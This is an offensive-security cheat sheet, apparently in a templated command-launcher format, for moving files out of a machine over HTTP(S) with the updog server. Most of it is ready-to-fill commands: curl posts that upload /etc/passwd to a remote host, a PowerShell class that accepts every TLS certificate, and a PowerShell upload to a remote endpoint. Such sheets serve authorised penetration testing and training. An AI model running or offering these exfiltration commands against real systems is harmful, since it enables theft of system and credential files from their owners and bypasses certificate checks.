# FileTransfer-HTTP(s)

% file transfer, exfiltration, injecton

#plateform/linux #target/serve  #cat/ATTACK/LISTEN-SERVE 


## updog - start server
#plateform/linux #target/serve  #cat/ATTACK/LISTEN-SERVE 
```
updog -d $(pwd) -p <lport|9090> [--ssl]
```

## updog - curl upload to (http)
For secured by password use http://:<password>@<ip>:<port>/upload
```
curl -XPOST -F "file=@<file|/etc/passwd>;filename=<filename|passwd>" -F "path=<path|.>" http://<ip>:<port|9090>/upload
```

## updog - curl upload to (https)
For secured by password use https://:<password>@<ip>:<port>/upload
```
curl -XPOST -k -F "file=@<file|/etc/passwd>;filename=<filename|passwd>" -F "path=<updog-path|.>" https://<ip>:<port|9090>/upload
```

## updog - powershell trust certificat
```
 add-type @"
    using System.Net;
    using System.Security.Cryptography.X509Certificates;
    public class TrustAllCertsPolicy : ICertificatePolicy {
        public bool CheckValidationResult(
            ServicePoint srvPoint, X509Certificate certificate,
            WebRequest request, int certificateProblem) {
            return true;
        }
    }
"@
[System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy
```

## updog - powershell upload (http)
For secured by password use http://:<password>@<ip>:<port>/upload
```
$f = Get-item <b64-file>
$body = @{
    file = $f
    path = '<path>'
}
Invoke-RestMethod -Method Post -Uri https://<ip>:<port|9090>/upload  -Form $body -Verbose -MaximumRedirection 0
```